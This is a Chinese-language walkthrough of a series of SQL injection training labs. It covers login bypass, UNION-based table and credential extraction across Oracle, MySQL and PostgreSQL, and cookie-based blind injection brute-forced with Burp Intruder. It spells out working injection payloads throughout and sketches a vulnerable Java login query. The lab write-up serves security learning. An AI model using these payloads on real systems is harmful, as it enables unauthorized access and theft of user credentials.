# SQL injection
## <font style="color:rgb(0, 19, 80);">SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</font>
进入靶场，发现是比较真实的环境，开始寻找注入点。

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757990419884-8bf6a18b-5ef9-44a4-89e0-ff4d26d30f5f.png)

随便点击一个搜索分类，发现被拼接到URL：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757990447164-e9d940f1-d373-4e87-90fc-6c5f54b54bfc.png)

加上`'`进行测试，确实存在注入，而且应该是字符型：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757990506112-44d55665-5c86-4ed7-9551-d79672350c0b.png)

构造形如`?category=Gifts' or '1'='1`的payload：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757990582923-c470b7b7-c187-4d22-8b4a-bb153eedca78.png)

显示了所有数据，注入成功。

## <font style="color:rgb(0, 19, 80);">SQL injection vulnerability allowing login bypass</font>
进入靶场，发现环境与刚才大抵类似，就是没有分类。

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757990736053-14887560-8a7d-415c-be80-43ec616f68c0.png)

题目提示是登录绕过，所以点击“My account”，出现登陆框：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757990943032-06f995e7-f33c-4002-91c5-3bbfe56d4bfc.png)

根据题目描述，Username输入`administrator`，密码随便输一个。抓包看看参数是如何传递的：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757991251995-7415db4d-6ec6-4109-8972-f279850c6b01.png)

可以看到是以POST参数的形式传递，如果后端代码是以Java写的，猜测类似于：

```java
public void doPost(HttpServletRequest request, HttpServletResponse response) {
    String username = request.getParameter("username");
    String password = request.getParameter("password");
    Connection conn = dataSource.getConnection();
    Statement stmt = conn.createStatement();
    String sql = "SELECT * FROM users WHERE username = '"
    + username + "' AND password = '" + password + "'";
    ResultSet rs = stmt.executeQuery(sql);
}

```

那么这个payload就可以修改成`username=administrator'--%20&password=administrator`

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757992775611-1198645a-29c3-4c07-8ff5-7d49383d8311.png)

可以看到成功绕过，登录进administrator账号：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757992378085-fb587b97-db96-4c7e-8831-cb4b63ffa722.png)

> 其实这里一开始用的是`username=administrator'#&password=administrator`，但是报服务器内部错误，说明数据库可能不是MySQL，可能是MS SQL Server，所以对其而言`#`不是注释。
>

## <font style="color:rgb(0, 19, 80);">SQL injection attack, querying the database type and version on Oracle</font>
进入靶场，发现提示要注出数据库类型和版本信息，而且明说是Oracle。

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758077696328-81685c57-39cc-4b9e-b805-6dd266f07280.png)

可以明显看到有分类，所以根据第一题的经验，这里大概率是注入点。随便选一个分类：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758077828480-1b9d0c58-db1c-420b-af6a-3a6800236256.png)

输入`?category=Gifts'`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758077864223-138f3ea1-2185-41de-bade-21615aea58a1.png)

用`?category=Gifts' order by 3--+`探测列数，发现有2列：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758078022474-c83fd970-b896-4e13-9abc-5f0d53ffed1c.png)

用`?category=Gifts' union select 'test1','test2' from dual--+`发现2列都会被回显（其实这里一开始用的`union select 1,2 from dual`但是报Internal Server Error，可能是Oracle对数据类型要求严格，目标列不是数字类型）：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758079112682-d7e90d3d-6bf2-467d-baac-341d1b29664c.png)

开始用`?category=Gifts' union select banner,null from v$version--+`回显数据库信息：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758078837210-ccfa933c-ecbe-4c0d-8346-b3d1722a18ec.png)

成功注出。

## <font style="color:rgb(0, 19, 80);">SQL injection attack, querying the database type and version on MySQL and Microsoft</font>
进入靶场，发现提示要注出MySQL和Microsoft的数据库类型和版本信息。

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758081213238-380e1703-59a1-4b96-9301-f9a1aa714887.png)

仍然有分类，随便选一个开始注入：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758081250584-d08e70fa-0c8e-4021-81c1-3e715dbaf4a5.png)

用`?category=Lifestyle' order by 3--+`探测列数，发现有2列：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758081512769-ff4423b4-a965-4783-b26a-e8013613fcae.png)

用`?category=Lifestyle' union select 1,2--+`发现两列都会回显：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758081600134-dc455227-a6aa-4e99-a8f1-2067d2bbd64c.png)

用`?category=Lifestyle' union select database(),version()--+`回显数据库信息：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758081689333-1abf6e16-0e2a-46a2-847e-99692d356522.png)

成功注入。

## <font style="color:rgb(0, 19, 80);">SQL injection attack, listing the database contents on non-Oracle databases</font>
进入靶场，发现环境是前面几类的结合，既有分类又有登录，题目提示我们要检索用户表的所有信息，并最终以`administrator`的身份登录。

用`order by`探测到当前有2列，题目有说到这是non-Oracle数据库，构造`?category=Pets' union select 1,2--+`报错，换成`?category=Pets' union select '1','2'--+`，两列都被回显：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758090171145-2ef111cd-043f-43a3-8425-f7ada2a46d11.png)

构造`?category=Pets' union select @@version,null--+`（查询MySQL和MSSQL）报错，换成`?category=Pets' union select version(),null--+`（查询PostgreSQL）：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758090630015-6280687f-e5a0-4159-a494-5c166cb91cbc.png)

确实是PostgreSQL，那么接下来就按照对应的语法注出数据库的数据。

构造`?category=Pets' union select current_database(),current_schema()--+`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758091610283-aaad919a-c473-4ba3-bdff-3b574f344ec5.png)

当前数据库是`academy_labs`，当前schema是`public`，构造`?category=Pets' union select table_name, null from information_schema.tables where table_schema='public' and table_catalog='academy_labs'--+`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758092064669-d8925422-e37c-4fee-a57c-2815cbeb9696.png)

查到当前库有`products`和`users_unptbv`两个表，用户信息应该在后者里，继续构造`?category=Pets' union select column_name, null from information_schema.columns where table_schema='public' and table_catalog='academy_labs' and table_name='users_unptbv'--+`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758092243092-8ea461a8-bfcf-4555-aa18-6d073d2d45d2.png)

查到当前表的三个字段是`email`、`password_bwkpzu`、`username_zxwqwx`，接下来要查出后面两个字段的内容，继续构造`?category=Pets' union select password_bwkpzu, username_zxwqwx from public.users_unptbv--+`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758092409159-c97b872a-403e-49db-910c-e61079eb9c0b.png)

拿到所有账号密码，以administrator登录：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758092469037-9751ffd7-83f7-4c8a-b3ef-128b2cc7b28d.png)

完成。

> 通过这题也可以看出自己对PostgreSQL的表结构并不如MySQL熟悉，要抽空把Oracle、MSSQL、PostgreSQL这几种数据库的表结构熟悉一下。
>

## <font style="color:rgb(0, 19, 80);">SQL injection attack, listing the database contents on Oracle</font>
这题和上题的区别在于这题明说是Oracle数据库：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758092653687-5cf6477d-39bd-4b79-8f19-0865d585f0ce.png)

首先通过`order by`探测到有2列，且构造`?category=Pets' union select '1','2' from dual--+`发现两列都回显。构造`?category=Pets' union select USER,null from dual--+`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758093656359-49fd274b-1e29-4d47-83ad-64978d762d4d.png)

可以看到当前用户是PETER，继续构造`?category=Pets' union select table_name,null from user_tables--+`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758093769617-a1b85faf-0b91-48ff-b6b2-ea9348f53236.png)

可以看到当前用户有两个表`PRODUCTS`和`USERS_SAYOPN`，用户信息应该在后者，继续构造`?category=Pets' union select <font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">column_name</font>,null from <font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">user_tab_columns where table_name='USERS_SAYOPN'</font>--+`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758093903197-30b93382-068d-4104-90b8-dc0165aae40e.png)

我们需要的是后面两个字段的信息，继续构造`?category=Pets' union select <font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">USERNAME_JOCGAC</font>,PASSWORD_BFXAWX from <font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">USERS_SAYOPN</font>--+`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758094153423-9c560d8d-0a52-45d3-bcad-5570526d4f54.png)

得到所有数据，以administrator登录：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758094202145-57914e9e-082c-4c20-bd58-225d3cc8b92d.png)

完成。

## <font style="color:rgb(0, 19, 80);">SQL injection UNION attack, determining the number of columns returned by the query</font>
进入靶场，找到注入点：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758094500402-44289862-5456-446e-98a3-61d3615b2da3.png)

用`order by`探测列数发现有3列，构造`?category=Accessories' union select 1,2,3--+`报错，换成`?category=Accessories' union select '111','222','333'--+`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758094880393-392bb92e-50c0-43c9-8843-5eff694068b8.png)

发现只有第二列会被回显。

按理说本题到此就该结束了，但是没有触发通过的信息。后来才发现本题的标准解法是直接用`union select`探测列数，通过一次次增加`null`，直到没有报错，就有多少列，形如`?category=Accessories' union select null,null,null--+`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758095198931-4c542067-e37d-420a-b068-3866787bc714.png)

## <font style="color:rgb(0, 19, 80);">SQL injection UNION attack, finding a column containing text</font>
本题描述要求是查找哪些列会被回显。首先还是用上一题要求的方法探测列数，发现有3列。探测哪一列会被回显，以前惯用做法是通过`union select '111','222','333'--+`，但是本题的标准做法依然是用`union select 'abcdef',null,null--+`，依次替换这段随机字符的位置（本题给定的随机字符是`<font style="color:rgb(51, 51, 50);">'n1dMaf'</font>`）：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758095838647-a8c6bc07-3aa3-4cb3-bb03-540ece00d082.png)

## <font style="color:rgb(0, 19, 80);">SQL injection UNION attack, retrieving data from other tables</font>
本题跟前面有点题思路类似，即找到一个叫`users`的表，有两个字段`username`和`password`，要获取所有信息并以administrator登录。

通过`order by`探测列数有2列，且都被回显，根据回显的注入方式推测数据库是PostgreSQL。那么接下来思路就跟第五题一样了。

构造`?category=Accessories' union select current_database(),current_schema()--+`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758096297878-05ce07ba-eb91-4eae-8a3f-35f95559b5c0.png)

数据都一样，库名是`academy_labs`，schema是`public`。构造`?category=Accessories' union select table_name, null from information_schema.tables where table_schema='public' and table_catalog='academy_labs'--+`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758096380986-5cde47cc-56f3-4842-b948-bc2dffa294f2.png)

有`products`和`users`表，我们需要的是后者。构造`?category=Accessories' union select column_name, null from information_schema.columns where table_schema='public' and table_catalog='academy_labs' and table_name='users'--+`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758096464863-1cefd132-ece7-4834-9e1d-f842b9672917.png)

继续注出`username`和`password`这两个字段的数据。构造`?category=Accessories' union select username, password from public.users--+`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758096547384-dce8afd8-6c22-4844-a3fe-23d15b249c49.png)

拿administrator的账号密码去登录：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758096589635-4a3ce35a-cf64-4bcf-bec6-45d723482a47.png)

成功。

> 做到这才发现自己犯傻了，明明题干已经给出了表名和字段名。。。只需要构造最后一步即可。
>

## <font style="color:rgb(0, 19, 80);">SQL injection UNION attack, retrieving multiple values in a single column</font>
本题描述跟上题一模一样，`order by`探测到列数是2列，只有第2列会被回显，根据回显的注入方式推测数据库是PostgreSQL。直接构造`?category=Gifts' union select null, concat(username,':',password) from public.users--+`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758097552570-cd2bb6af-8b3c-4ac0-a633-0e7d346f5b54.png)

得到所有数据，以administrator登录：**<font style="color:rgb(51, 51, 50);"></font>**

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758097593579-633c9492-4902-43eb-857f-a840147ababc.png)

成功。

## <font style="color:rgb(0, 19, 80);">Blind SQL injection with conditional responses</font>
这题是盲注，题目描述中说每个查询包含cookie，如果查询结果返回任何行，页面有一条`Welcome back`信息，反之则没有。最好需要查到`users`表字段`username`和`password`的数据，并以administrator登录。

通过BP抓包可以看到cookie：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758098862910-9afed2f0-45b2-4fd2-b670-4d4c303ed5e4.png)

在TrackingId中构造恒真恒假条件`TrackingId=EDx2Dz5ZrmzWIYDx' and '1'='1`和`TrackingId=EDx2Dz5ZrmzWIYDx' and '1'='2`，两个请求都有响应，但是前者有`Welcome back`信息：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758099009725-9def4813-9760-4e13-9119-ff5b04b9393e.png)

构造形如`TrackingId=EDx2Dz5ZrmzWIYDx' and (select '1' from users where username='administrator' and length(password)>1)='1`确定administrator用户的密码位数，逐个增加，最后发现是20位。

接着开始逐位爆破，题目提示密码是全小写字母或者数字，构造形如`TrackingId=EDx2Dz5ZrmzWIYDx' and (select substr(password,1,1) from users where username='administrator')='a`来确定每一位，这一步通过BP的Intruder模块来爆破：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758100206909-ef3a4da1-5750-4ce2-8574-5b48b8554afc.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758100819316-46b4251b-be31-4ad4-91f5-e8708b89e890.png)

开始攻击，对Length进行排序：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758100875149-81441eb0-7a99-4be1-9733-7d86c92c38e3.png)

图中高亮部分的Length明显与其他不同，就是正确的爆破，将其组合起来，得知密码是：ou8m1bvx7dn6qdgyoa06：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758100901486-7357ad56-0d12-4ee5-8012-41c021193e64.png)

登录成功：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758100990736-7a48d9da-6935-41c9-9be5-ce34bcd35075.png)

## <font style="color:rgb(0, 19, 80);">Blind SQL injection with conditional errors</font>
本题与上一题的题干大抵类似，只不过这题提示说SQL查询有报错会返回报错信息，而且用的是Oracle数据库。首先抓包后在cookie后加上`'`看看报错信息是什么样的：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758158274562-53eeb028-b3c8-4e57-b8e6-812bc1f7df8c.png)





